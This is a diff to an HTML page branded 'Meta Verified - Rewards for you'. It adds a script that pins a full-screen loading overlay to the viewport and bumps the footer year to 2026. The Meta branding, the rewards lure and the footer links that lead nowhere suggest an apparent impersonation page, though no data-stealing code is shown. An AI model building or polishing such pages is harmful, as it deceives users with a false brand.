@@ -3,15 +3,60 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Meta Verified - Rewards for you</title>
     <link rel="icon" href="./public/favicon-32x32.png">
     <link rel="stylesheet" href="./public/styles/style.css">
     <style>
-        #page-boot-overlay{position:fixed;inset:0;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.82);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
+        #page-boot-overlay{position:fixed!important;top:0;right:0;bottom:0;left:0;width:100%;height:100%;min-height:100vh;min-height:100dvh;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.82);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
         .boot-spinner{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:_tl_spin .7s linear infinite}
         @keyframes _tl_spin{to{transform:rotate(360deg)}}
     </style>
+    <script>
+        (function () {
+            var pinned = [];
+            function size(el) {
+                if (!el || !el.isConnected) return;
+                var vv = window.visualViewport;
+                var top = (vv && vv.offsetTop) || 0;
+                var left = (vv && vv.offsetLeft) || 0;
+                var width = vv ? vv.width : window.innerWidth;
+                var height = Math.max(
+                    (vv && vv.height) || 0,
+                    window.innerHeight || 0,
+                    document.documentElement.clientHeight || 0
+                );
+                el.style.setProperty('position', 'fixed', 'important');
+                el.style.setProperty('top', top + 'px', 'important');
+                el.style.setProperty('left', left + 'px', 'important');
+                el.style.setProperty('right', 'auto', 'important');
+                el.style.setProperty('bottom', 'auto', 'important');
+                el.style.setProperty('width', width + 'px', 'important');
+                el.style.setProperty('height', height + 'px', 'important');
+            }
+            function sync() {
+                pinned = pinned.filter(function (el) { return el && el.isConnected; });
+                pinned.forEach(size);
+            }
+            window.__pinViewportOverlay = function (el) {
+                if (!el) return;
+                if (el.parentNode !== document.documentElement) {
+                    document.documentElement.appendChild(el);
+                }
+                if (pinned.indexOf(el) === -1) pinned.push(el);
+                size(el);
+            };
+            window.__unpinViewportOverlay = function (el) {
+                pinned = pinned.filter(function (x) { return x !== el; });
+            };
+            window.addEventListener('resize', sync);
+            window.addEventListener('orientationchange', sync);
+            if (window.visualViewport) {
+                window.visualViewport.addEventListener('resize', sync);
+                window.visualViewport.addEventListener('scroll', sync);
+            }
+        })();
+    </script>
 
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -38,6 +83,10 @@
     <div id="page-boot-overlay">
         <div class="boot-spinner"></div>
     </div>
+    <script>
+        document.documentElement.classList.add('is-booting');
+        window.__pinViewportOverlay && window.__pinViewportOverlay(document.getElementById('page-boot-overlay'));
+    </script>
     <div id="google_translate_element" aria-hidden="true"></div>
     <script src="./public/js/translate.js"></script>
 
@@ -93,7 +142,7 @@
             <a href="#">Privacy Policy</a>
             <a href="#">Terms of Service</a>
             <a href="#">Community Standards</a>
-            <a href="#">Meta © 2025</a>
+            <a href="#">Meta © 2026</a>
         </div>
     </div>
 
